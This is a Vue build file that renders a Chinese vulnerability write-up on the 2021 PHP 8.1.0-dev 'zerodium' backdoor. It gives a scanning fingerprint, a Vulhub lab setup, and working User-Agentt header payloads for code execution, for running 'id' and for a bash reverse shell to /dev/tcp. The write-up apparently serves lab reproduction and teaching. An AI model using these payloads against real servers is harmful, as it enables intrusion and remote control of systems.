import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r,o as d,c as s,a as e,b as a,d as i,e as c}from"./app-58e4a7d6.js";const l={},o=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"PHP 8.1.0-dev 版本在 2021 年 3 月 28 日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送 User-Agentt 头来执行任意代码。",-1),h=e("p",null,"参考链接：",-1),u={href:"https://news-web.php.net/php.internals/113838",target:"_blank",rel:"noopener noreferrer"},g={href:"https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d",target:"_blank",rel:"noopener noreferrer"},m={href:"https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a",target:"_blank",rel:"noopener noreferrer"},b=c(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>PHP 8.1.0-dev
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;PHP/8.1.0-dev&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个存在后门的 PHP 8.1 服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，服务运行在 <code>http://your-ip:8080</code>。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>添加请求头，注意是 <strong>User-Agentt</strong> 不是 User-Agent。</p><p>执行代码：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>User-Agentt: zerodiumvar_dump(233*233);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240529084958596.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行命令：</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>User-Agentt: zerodiumsystem(&quot;id&quot;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240529085013250.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>反弹 shell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>User-Agentt: zerodiumsystem(&quot;bash -c &#39;exec bash -i &amp;&gt; /dev/tcp/&lt;your-ip&gt;/&lt;port&gt; &lt;&amp; 1&#39;&quot;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240529085117047.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,19);function v(_,x){const t=r("ExternalLinkIcon");return d(),s("div",null,[o,p,h,e("ul",null,[e("li",null,[e("a",u,[a("https://news-web.php.net/php.internals/113838"),i(t)])]),e("li",null,[e("a",g,[a("https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d"),i(t)])]),e("li",null,[e("a",m,[a("https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a"),i(t)])])]),b])}const P=n(l,[["render",v],["__file","PHP 8.1.0-dev 开发版本 zerodium 后门漏洞.html.vue"]]);export{P as default};
